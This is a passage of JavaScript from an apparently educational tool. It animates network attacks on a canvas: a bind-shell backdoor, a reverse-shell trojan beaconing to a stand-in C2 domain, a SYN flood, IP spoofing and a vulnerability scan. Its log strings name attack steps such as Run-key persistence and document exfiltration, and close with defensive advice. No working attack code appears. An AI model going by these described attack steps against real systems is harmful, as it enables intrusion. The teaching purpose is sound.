        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('PASSIVE BACKDOOR PORT LISTENER & SHELL BIND', w / 2, 22);
        const fX = w * 0.52, fY = h * 0.55;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.01)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
        ctx.beginPath(); ctx.fillRect(fX - 4, h * 0.2, 8, h * 0.6);
        const gateActive = frame > 90;
        ctx.fillStyle = gateActive ? 'rgba(57, 255, 20, 0.15)' : 'rgba(255, 59, 59, 0.2)';
        ctx.strokeStyle = gateActive ? '#39ff14' : '#ff3b3b';
        ctx.lineWidth = 2;
        ctx.beginPath(); ctx.roundRect(fX - 15, fY - 20, 30, 40, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = gateActive ? '#39ff14' : '#ff3b3b'; ctx.font = 'bold 7px monospace'; ctx.textAlign = 'center';
        ctx.fillText('PORT', fX, fY - 6);
        ctx.fillText('9999', fX, fY + 4);
        ctx.fillText(gateActive ? '[OPEN]' : '[BLOCKED]', fX, fY + 14);
        const hostX = w * 0.76, hostY = h * 0.5;
        const isListening = frame > 40;
        ctx.fillStyle = isListening ? 'rgba(255, 59, 59, 0.1)' : 'rgba(255, 255, 255, 0.02)';
        ctx.strokeStyle = isListening ? '#ff3b3b' : 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(hostX - 45, hostY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isListening ? '#ff3b3b' : '#8892a8'; ctx.font = 'bold 9px monospace';
        ctx.fillText('VICTIM PC', hostX, hostY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText(isListening ? 'netstat: LISTEN' : 'Standby', hostX, hostY);
        ctx.fillText('Egress: 0 packets', hostX, hostY + 15);
        const attX = w * 0.22, attY = h * 0.5;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)'; ctx.strokeStyle = '#8b5cf6';
        ctx.beginPath(); ctx.roundRect(attX - 45, attY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#8b5cf6'; ctx.font = 'bold 9px monospace';
        ctx.fillText('ATTACKER PC', attX, attY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('nmap scan...', attX, attY);
        if (frame > 220) {
            ctx.beginPath(); ctx.moveTo(attX + 45, attY); ctx.lineTo(fX - 15, fY);
            ctx.strokeStyle = '#8b5cf6'; ctx.lineWidth = 1.5; ctx.stroke();
            ctx.fillStyle = '#8b5cf6'; ctx.font = 'bold 8px monospace';
            ctx.fillText('Inbound Sync', (attX + fX) / 2, attY - 10);
        }

        if (frame > 280) {
            ctx.beginPath(); ctx.moveTo(fX + 15, fY); ctx.lineTo(hostX - 45, hostY);
            ctx.strokeStyle = '#39ff14'; ctx.lineWidth = 1.5; ctx.stroke();
            ctx.fillStyle = '#39ff14'; ctx.font = 'bold 8px monospace';
            ctx.fillText('Shell Spawned', (fX + hostX) / 2, hostY + 20);
            egress = `${(frame - 280) * 12} B`;
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = listeningPorts;
            if (e1) e1.textContent = rulesInjected;
            if (e2) e2.textContent = egress;
            if (e3) e3.textContent = inbound;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Attacker gains console shell access. Configure ingress host-based firewall rules!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateActiveTrojan = function() {
    termLog('> Registering startup persistence handlers...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, heartbeats = 0, dataTx = 0;
    const beacons = [];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Autorun registry key configured: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Querying DNS resolvers for C2 domain beacons...', 'warning'); }, 1400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Outbound TCP handshakes resolved. Tunnel established via reverse HTTPS (Port 443).', 'error'); }, 2200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> C2 shell command parsed: exfiltrating local documents directory.', 'error'); }, 3000);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center';
        ctx.fillText('ACTIVE REVERSE SHELL TUNNELING & BEACONING', w / 2, 22);
        const hostX = w * 0.18, hostY = h * 0.5;
        const fX = w * 0.48, fY = h * 0.5;
        const c2X = w * 0.82, c2Y = h * 0.5;
        ctx.fillStyle = 'rgba(255, 59, 59, 0.12)'; ctx.strokeStyle = '#ff3b3b';
        ctx.beginPath(); ctx.roundRect(hostX - 45, hostY - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 9px monospace';
        ctx.fillText('INFECTED PC', hostX, hostY - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('Agent: beaconing', hostX, hostY - 5);
        ctx.fillText('Internal network', hostX, hostY + 15);
        ctx.fillStyle = 'rgba(255, 255, 255, 0.01)'; ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
        ctx.beginPath(); ctx.fillRect(fX - 4, h * 0.2, 8, h * 0.6);
        ctx.fillStyle = 'rgba(255, 59, 59, 0.1)'; ctx.strokeStyle = '#ff3b3b';
        ctx.beginPath(); ctx.arc(fX, fY - 50, 12, 0, Math.PI * 2); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 7px monospace'; ctx.textAlign = 'center';
        ctx.fillText('IN', fX, fY - 52); ctx.fillText('BLOCKED', fX, fY - 43);
        ctx.fillStyle = 'rgba(57, 255, 20, 0.1)'; ctx.strokeStyle = '#39ff14';
        ctx.beginPath(); ctx.arc(fX, fY + 50, 12, 0, Math.PI * 2); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#39ff14'; ctx.font = 'bold 7px monospace';
        ctx.fillText('OUT', fX, fY + 48); ctx.fillText('OK', fX, fY + 57);
        const isC2Linked = frame > 120;
        ctx.fillStyle = isC2Linked ? 'rgba(139, 92, 246, 0.15)' : 'rgba(255, 255, 255, 0.02)';
        ctx.strokeStyle = isC2Linked ? '#8b5cf6' : 'rgba(255, 255, 255, 0.1)';
        ctx.beginPath(); ctx.roundRect(c2X - 45, c2Y - 40, 90, 80, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isC2Linked ? '#8b5cf6' : '#8892a8'; ctx.font = 'bold 9px monospace';
        ctx.fillText('C2 SERVER', c2X, c2Y - 20);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('attacker-dns.org', c2X, c2Y - 5);
        ctx.fillStyle = isC2Linked ? '#39ff14' : '#525c70'; ctx.font = 'bold 7px monospace';
        ctx.fillText(isC2Linked ? '[TUNNEL OPEN]' : '[OFFLINE]', c2X, c2Y + 15);
        if (frame > 80 && frame % 40 === 0 && beacons.length < 8) {
            beacons.push({ x: hostX + 45, y: hostY, tx: c2X - 45, ty: c2Y, p: 0 });
            heartbeats++;
        }

        beacons.forEach(b => {
            b.p += 0.02;
            const bx = b.x + (b.tx - b.x) * b.p;
            const by = b.y + (b.ty - b.y) * b.p;
            ctx.beginPath(); ctx.arc(bx, by, 4, 0, Math.PI * 2);
            ctx.fillStyle = '#ff3b3b'; ctx.fill();
            if (b.p >= 1) {
                b.dead = true;
                termLog(`> Beacon pulse received on C2. Handshake response sent.`, 'warning');
                dataTx += 8;
            }
        });
        for (let i = beacons.length - 1; i >= 0; i--) {
            if (beacons[i].dead) beacons.splice(i, 1);
        }
        if (isC2Linked) {
            ctx.beginPath(); ctx.moveTo(hostX + 45, hostY); ctx.lineTo(c2X - 45, c2Y);
            ctx.strokeStyle = 'rgba(57, 255, 20, 0.25)'; ctx.lineWidth = 1.5; ctx.stroke();
        }

        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = heartbeats;
            if (e1) e1.textContent = 'HTTPS (443)';
            if (e2) e2.textContent = '5s';
            if (e3) e3.textContent = `${dataTx} KB`;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Simulation done. Reverse connection established to C2. Restrict outbound network policies!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateDoS = function() {
    termLog('> Initiating single-source SYN flood attack...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    const attackerX = w * 0.12, attackerY = h * 0.5;
    const serverX = w * 0.78, serverY = h * 0.5;
    const serverR = 32;
    let frame = 0, synPerSec = 0, halfOpen = 0, serverMem = 0, serverHealth = 100;
    const packets = [];
    const halfOpenSlots = [];
    const maxSlots = 18;
    for (let i = 0; i < maxSlots; i++) {
        const angle = -Math.PI / 2 + (i / maxSlots) * Math.PI * 2;
        halfOpenSlots.push({ angle, x: serverX + Math.cos(angle) * (serverR + 28), y: serverY + Math.sin(angle) * (serverR + 28), active: false, age: 0 });
    }

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> SYN flood started — 12,000 packets/sec from single host.', 'error'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Server TCP backlog filling — half-open connections accumulating.', 'warning'); }, 1800);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Connection table FULL. Memory at critical level!', 'error'); }, 3000);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Service DENIED — legitimate connections refused.', 'error'); }, 4200);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        const bg = ctx.createRadialGradient(serverX, serverY, 0, serverX, serverY, Math.min(w, h) / 1.5);
        bg.addColorStop(0, `rgba(40, 12, 5, ${Math.min(0.85, frame / 300)})`);
        bg.addColorStop(1, 'rgba(6, 10, 19, 0)');
        ctx.fillStyle = bg; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(255, 107, 53, 0.12)'; ctx.strokeStyle = '#ff6b35';
        ctx.lineWidth = 1.5;
        ctx.beginPath(); ctx.roundRect(attackerX - 40, attackerY - 35, 80, 70, 6); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ff6b35'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
        ctx.fillText('ATTACKER', attackerX, attackerY - 18);
        ctx.fillStyle = '#8892a8'; ctx.font = '8px monospace';
        ctx.fillText('192.168.1.66', attackerX, attackerY - 4);
        ctx.fillStyle = '#ff6b35'; ctx.font = 'bold 8px monospace';
        ctx.fillText('[ FLOODING ]', attackerX, attackerY + 14);
        const pulseR = 40 + Math.sin(frame * 0.1) * 6;
        ctx.beginPath(); ctx.arc(attackerX, attackerY, pulseR, 0, Math.PI * 2);
        ctx.strokeStyle = `rgba(255, 107, 53, ${0.15 + Math.sin(frame * 0.1) * 0.1})`; ctx.lineWidth = 1; ctx.stroke();
        const hc = serverHealth > 60 ? '#39ff14' : serverHealth > 25 ? '#ffaa00' : '#ff3b3b';
        ctx.beginPath();
        ctx.arc(serverX, serverY, serverR + 10, -Math.PI / 2, -Math.PI / 2 + (serverHealth / 100) * Math.PI * 2);
        ctx.strokeStyle = hc; ctx.lineWidth = 3; ctx.stroke();
        ctx.beginPath(); ctx.arc(serverX, serverY, serverR, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(255, 107, 53, ${0.08 + (1 - serverHealth / 100) * 0.25})`; ctx.fill();
        ctx.strokeStyle = hc; ctx.lineWidth = 2; ctx.stroke();
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('SERVER', serverX, serverY - 8);
        ctx.fillStyle = hc; ctx.font = 'bold 9px monospace';
        ctx.fillText(`${Math.round(serverHealth)}%`, serverX, serverY + 8);
        halfOpenSlots.forEach((slot, i) => {
            if (slot.active) {
                slot.age++;
                const flicker = Math.sin(slot.age * 0.15 + i) * 0.3 + 0.7;
                ctx.beginPath(); ctx.arc(slot.x, slot.y, 5, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(255, 170, 0, ${flicker * 0.8})`; ctx.fill();
                ctx.strokeStyle = `rgba(255, 170, 0, ${flicker * 0.5})`; ctx.lineWidth = 0.5; ctx.stroke();
                ctx.beginPath(); ctx.moveTo(slot.x, slot.y); ctx.lineTo(serverX, serverY);
                ctx.strokeStyle = `rgba(255, 170, 0, ${flicker * 0.15})`; ctx.lineWidth = 0.5; ctx.stroke();
            } else {
                ctx.beginPath(); ctx.arc(slot.x, slot.y, 3, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(255, 255, 255, 0.06)'; ctx.fill();
            }
        });
        if (frame > 30 && frame % 3 === 0) {
            const jitterY = rnd(-30, 30);
            packets.push({ x: attackerX + 40, y: attackerY + jitterY, progress: 0, size: rnd(2, 4.5) });
            synPerSec++;
        }
        for (let i = packets.length - 1; i >= 0; i--) {
            const pkt = packets[i];
            pkt.progress += 0.025;
            const px = attackerX + 40 + (serverX - serverR - attackerX - 40) * pkt.progress;
            const py = pkt.y + (serverY - pkt.y) * pkt.progress;
            const alpha = 1 - pkt.progress;
            ctx.beginPath(); ctx.arc(px, py, pkt.size * (1 - pkt.progress * 0.4), 0, Math.PI * 2);
            ctx.fillStyle = `rgba(255, 107, 53, ${alpha})`; ctx.fill();
            if (i % 8 === 0 && pkt.progress < 0.3) {
                ctx.fillStyle = `rgba(255, 107, 53, ${alpha * 0.6})`; ctx.font = '6px monospace'; ctx.textAlign = 'left';
                ctx.fillText('SYN', px + 6, py - 3);
            }
            if (pkt.progress >= 1) {
                packets.splice(i, 1);
                const freeSlot = halfOpenSlots.find(s => !s.active);
                if (freeSlot) { freeSlot.active = true; freeSlot.age = 0; halfOpen++; }
                serverHealth = Math.max(0, serverHealth - 0.12);
                serverMem = Math.min(100, 100 - serverHealth);
            }
        }
        const midX = (attackerX + serverX) / 2, midY = h * 0.22;
        ctx.fillStyle = 'rgba(255, 107, 53, 0.7)'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
        ctx.fillText('TCP SYN FLOOD — SINGLE SOURCE', midX, midY);
        ctx.fillStyle = 'rgba(255,255,255,0.3)'; ctx.font = '7px monospace';
        ctx.fillText('No ACK returned → half-open connections pile up', midX, midY + 14);
        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = (synPerSec * 600).toLocaleString();
            if (e1) e1.textContent = halfOpen;
            if (e2) e2.textContent = `${Math.round(serverMem)}%`;
            if (e3) {
                const status = serverHealth > 60 ? 'ONLINE' : serverHealth > 25 ? 'DEGRADED' : 'OFFLINE';
                e3.textContent = status;
                e3.style.color = hc;
            }
            synPerSec = 0;
            setProgress(Math.min(100, (frame / 420) * 100));
        }

        if (frame >= 420) {
            setProgress(100);
            termLog('> Simulation complete. Single-source DoS demonstrated. Enable SYN cookies & rate-limiting!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateIPSpoofing = function() {
    termLog('> Scanning target network for trusted host relationships...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    const attackerX = w * 0.10, attackerY = h * 0.5;
    const trustedX = w * 0.10, trustedY = h * 0.18;
    const firewallX = w * 0.50, firewallY = h * 0.5;
    const serverX = w * 0.85, serverY = h * 0.5;

    let frame = 0, packetsForged = 0, trustLevel = 0, firewallBypassed = false;
    const spoofedIP = '10.0.0.5';
    const realIP = '77.41.128.9';
    const packets = [];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog(`> Trusted host identified: ${spoofedIP}. Forging packet headers...`, 'warning'); }, 800);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog(`> Sending spoofed packets (SRC: ${spoofedIP}) to target server.`, 'error'); }, 2000);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); firewallBypassed = true; termLog('> Firewall ACL bypassed! Target trusts spoofed source address.', 'error'); }, 3200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Unauthorized access achieved via trust exploitation.', 'error'); }, 4400);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('IP SPOOFING — PACKET HEADER FORGERY', w / 2, 18);
        ctx.fillStyle = 'rgba(57, 255, 20, 0.06)'; ctx.strokeStyle = 'rgba(57, 255, 20, 0.3)';
        ctx.lineWidth = 1;
        ctx.beginPath(); ctx.roundRect(trustedX - 38, trustedY - 28, 76, 56, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#39ff14'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
        ctx.fillText('TRUSTED HOST', trustedX, trustedY - 12);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText(spoofedIP, trustedX, trustedY + 2);
        ctx.fillStyle = 'rgba(57, 255, 20, 0.5)'; ctx.font = '7px monospace';
        ctx.fillText('(Impersonated)', trustedX, trustedY + 16);
        ctx.setLineDash([3, 4]);
        ctx.beginPath(); ctx.moveTo(attackerX, attackerY - 35); ctx.lineTo(trustedX, trustedY + 28);
        ctx.strokeStyle = 'rgba(224, 64, 251, 0.25)'; ctx.lineWidth = 1; ctx.stroke();
        ctx.setLineDash([]);
        ctx.fillStyle = 'rgba(224, 64, 251, 0.12)'; ctx.strokeStyle = '#e040fb';
        ctx.lineWidth = 1.5;
        ctx.beginPath(); ctx.roundRect(attackerX - 42, attackerY - 35, 84, 70, 5); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#e040fb'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
        ctx.fillText('ATTACKER', attackerX, attackerY - 18);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText(`Real: ${realIP}`, attackerX, attackerY - 4);
        ctx.fillStyle = '#e040fb'; ctx.font = 'bold 7px monospace';
        ctx.fillText(`Spoofs: ${spoofedIP}`, attackerX, attackerY + 10);
        if (frame > 60) {
            const blink = Math.sin(frame * 0.12) > 0;
            if (blink) {
                ctx.fillStyle = '#ff3b3b'; ctx.font = 'bold 7px monospace';
                ctx.fillText('[ FORGING HEADERS ]', attackerX, attackerY + 26);
            }
        }
        const fwColor = firewallBypassed ? 'rgba(255, 59, 59, 0.6)' : 'rgba(57, 255, 20, 0.4)';
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)';
        ctx.strokeStyle = fwColor;
        ctx.lineWidth = 2;
        ctx.beginPath(); ctx.fillRect(firewallX - 6, h * 0.15, 12, h * 0.7);
        ctx.strokeRect(firewallX - 6, h * 0.15, 12, h * 0.7);
        ctx.fillStyle = fwColor; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
        ctx.fillText('FIREWALL', firewallX, h * 0.11);
        ctx.fillStyle = firewallBypassed ? '#ff3b3b' : '#39ff14'; ctx.font = '7px monospace';
        ctx.fillText(firewallBypassed ? 'BYPASSED' : 'ACL ACTIVE', firewallX, h * 0.88);
        ctx.fillStyle = 'rgba(255,255,255,0.5)'; ctx.font = '6px monospace';
        ctx.fillText('Whitelist:', firewallX, h * 0.28);
        ctx.fillStyle = '#39ff14';
        ctx.fillText(spoofedIP, firewallX, h * 0.33);
        const serverTrust = Math.min(100, trustLevel);
        const sc = serverTrust > 70 ? '#ff3b3b' : serverTrust > 30 ? '#ffaa00' : '#39ff14';
        ctx.fillStyle = 'rgba(0, 200, 255, 0.08)'; ctx.strokeStyle = '#00c8ff';
        ctx.lineWidth = 1.5;
        ctx.beginPath(); ctx.roundRect(serverX - 45, serverY - 38, 90, 76, 5); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#00c8ff'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
        ctx.fillText('TARGET SERVER', serverX, serverY - 22);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('10.0.0.1', serverX, serverY - 8);
        ctx.fillStyle = 'rgba(255,255,255,0.1)';
        ctx.fillRect(serverX - 30, serverY + 8, 60, 6);
        ctx.fillStyle = sc;
        ctx.fillRect(serverX - 30, serverY + 8, (serverTrust / 100) * 60, 6);
        ctx.fillStyle = '#fff'; ctx.font = '6px monospace';
        ctx.fillText(`Trust: ${Math.round(serverTrust)}%`, serverX, serverY + 26);
        if (frame > 80 && frame % 12 === 0) {
            packets.push({ x: attackerX + 42, y: attackerY, progress: 0 });
            packetsForged++;
        }

        for (let i = packets.length - 1; i >= 0; i--) {
            const pkt = packets[i];
            pkt.progress += 0.015;
            let px, py;
            if (pkt.progress < 0.5) {
                const t = pkt.progress / 0.5;
                px = attackerX + 42 + (firewallX - attackerX - 42) * t;
                py = attackerY + (firewallY - attackerY) * t;
            } else {
                const t = (pkt.progress - 0.5) / 0.5;
                px = firewallX + 6 + (serverX - 45 - firewallX - 6) * t;
                py = firewallY + (serverY - firewallY) * t;
            }

            const alpha = 0.9 - pkt.progress * 0.5;
            ctx.fillStyle = `rgba(224, 64, 251, ${alpha * 0.7})`; ctx.strokeStyle = `rgba(224, 64, 251, ${alpha})`;
            ctx.lineWidth = 1;
            ctx.beginPath(); ctx.roundRect(px - 14, py - 8, 28, 16, 2); ctx.fill(); ctx.stroke();
            ctx.fillStyle = `rgba(57, 255, 20, ${alpha})`; ctx.font = 'bold 5px monospace'; ctx.textAlign = 'center';
            ctx.fillText(`SRC:${spoofedIP}`, px, py + 1);
            if (pkt.progress > 0.48 && pkt.progress < 0.52) {
                ctx.beginPath(); ctx.arc(firewallX, firewallY, 15, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(57, 255, 20, 0.15)'; ctx.fill();
            }

            if (pkt.progress >= 1) {
                packets.splice(i, 1);
                trustLevel = Math.min(100, trustLevel + 1.5);
            }
        }
        if (frame > 60) {
            const panelX = w * 0.30, panelY = h * 0.78;
            ctx.fillStyle = 'rgba(224, 64, 251, 0.06)'; ctx.strokeStyle = 'rgba(224, 64, 251, 0.25)';
            ctx.lineWidth = 1;
            ctx.beginPath(); ctx.roundRect(panelX - 75, panelY - 18, 150, 40, 3); ctx.fill(); ctx.stroke();
            ctx.fillStyle = '#e040fb'; ctx.font = 'bold 7px monospace'; ctx.textAlign = 'center';
            ctx.fillText('FORGED PACKET HEADER', panelX, panelY - 8);
            ctx.fillStyle = '#39ff14'; ctx.font = '6px monospace';
            ctx.fillText(`SRC IP: ${spoofedIP}  (FAKE)`, panelX, panelY + 4);
            ctx.fillStyle = '#ff3b3b'; ctx.font = '6px monospace';
            ctx.fillText(`REAL IP: ${realIP}  (HIDDEN)`, panelX, panelY + 14);
        }
        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = packetsForged;
            if (e1) e1.textContent = spoofedIP;
            if (e2) { e2.textContent = firewallBypassed ? 'Yes' : 'No'; e2.style.color = firewallBypassed ? '#ff3b3b' : '#39ff14'; }
            if (e3) e3.textContent = `${Math.round(trustLevel)}%`;
            setProgress(Math.min(100, (frame / 400) * 100));
        }

        if (frame >= 400) {
            setProgress(100);
            termLog('> Simulation complete. IP Spoofing demonstrated. Use ingress filtering & IPsec authentication!', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateVulnScan = function() {
    termLog('> Initializing vulnerability scanner (OpenVAS engine)...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, portsScanned = 0, servicesFound = 0, vulnsDetected = 0, criticalCVEs = 0;
    const hosts = [];
    const cols = 5, rows = 3;
    for (let r = 0; r < rows; r++) {
        for (let c = 0; c < cols; c++) {
            const hx = w * 0.22 + c * (w * 0.14);
            const hy = h * 0.22 + r * (h * 0.24);
            const ports = [22, 80, 443, 3306, 8080, 21, 25, 53, 445, 3389].slice(0, rndInt(3, 8));
            const vulnCount = rndInt(0, 4);
            hosts.push({
                x: hx, y: hy, ip: `10.0.${r}.${c + 1}`,
                ports, scanned: false, scanning: false, scanProgress: 0,
                vulns: vulnCount, criticals: vulnCount > 2 ? rndInt(1, 2) : 0,
                services: ports.map(p => ({ port: p, name: p === 22 ? 'SSH' : p === 80 ? 'HTTP' : p === 443 ? 'HTTPS' : p === 3306 ? 'MySQL' : p === 8080 ? 'Tomcat' : p === 21 ? 'FTP' : p === 25 ? 'SMTP' : p === 53 ? 'DNS' : p === 445 ? 'SMB' : 'RDP' })),
            });
        }
    }
    let currentHostIdx = -1;
    const scannerX = w * 0.06, scannerY = h * 0.5;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Port scanning target subnet 10.0.0.0/24...', 'warning'); }, 500);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Fingerprinting services — matching against CVE database...', 'warning'); }, 2500);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> CRITICAL: CVE-2024-3094 (XZ Utils backdoor) detected on 10.0.1.2!', 'error'); }, 4000);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Scan complete. Generating prioritized remediation report.', 'success'); }, 5500);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('VULNERABILITY SCANNER — NETWORK AUDIT', w / 2, 16);
        ctx.fillStyle = 'rgba(0, 229, 255, 0.1)'; ctx.strokeStyle = '#00e5ff'; ctx.lineWidth = 1.5;
        ctx.beginPath(); ctx.roundRect(scannerX - 28, scannerY - 24, 56, 48, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#00e5ff'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
        ctx.fillText('SCANNER', scannerX, scannerY - 8);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText('OpenVAS', scannerX, scannerY + 6);
        const pulseR = 28 + Math.sin(frame * 0.08) * 4;
        ctx.beginPath(); ctx.arc(scannerX, scannerY, pulseR, 0, Math.PI * 2);
        ctx.strokeStyle = `rgba(0, 229, 255, ${0.1 + Math.sin(frame * 0.08) * 0.08})`; ctx.lineWidth = 1; ctx.stroke();
        if (frame % 25 === 0 && currentHostIdx < hosts.length - 1) {
            currentHostIdx++;
            hosts[currentHostIdx].scanning = true;
        }
        hosts.forEach((host, idx) => {
            if (host.scanning && !host.scanned) {
                host.scanProgress += 0.02;
                if (host.scanProgress >= 1) {
                    host.scanned = true;
                    host.scanning = false;
                    portsScanned += host.ports.length;
                    servicesFound += host.services.length;
                    vulnsDetected += host.vulns;
                    criticalCVEs += host.criticals;
                }
            }
            const boxColor = host.scanned
                ? (host.vulns > 2 ? '#ff3b3b' : host.vulns > 0 ? '#ffaa00' : '#39ff14')
                : (host.scanning ? '#00e5ff' : 'rgba(255,255,255,0.15)');
            ctx.fillStyle = host.scanned
                ? (host.vulns > 2 ? 'rgba(255,59,59,0.1)' : host.vulns > 0 ? 'rgba(255,170,0,0.08)' : 'rgba(57,255,20,0.08)')
                : 'rgba(255,255,255,0.02)';
            ctx.strokeStyle = boxColor; ctx.lineWidth = 1;
            ctx.beginPath(); ctx.roundRect(host.x - 30, host.y - 20, 60, 40, 3); ctx.fill(); ctx.stroke();
            ctx.fillStyle = boxColor; ctx.font = 'bold 7px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
            ctx.fillText(host.ip, host.x, host.y - 8);
            if (host.scanned) {
                ctx.fillStyle = host.vulns > 2 ? '#ff3b3b' : host.vulns > 0 ? '#ffaa00' : '#39ff14';
                ctx.font = '6px monospace';
                ctx.fillText(host.vulns > 0 ? `${host.vulns} CVEs` : 'CLEAN', host.x, host.y + 6);
            } else if (host.scanning) {
                ctx.fillStyle = 'rgba(255,255,255,0.1)';
                ctx.fillRect(host.x - 20, host.y + 4, 40, 3);
                ctx.fillStyle = '#00e5ff';
                ctx.fillRect(host.x - 20, host.y + 4, 40 * host.scanProgress, 3);
            }
            if (host.scanning && !host.scanned) {
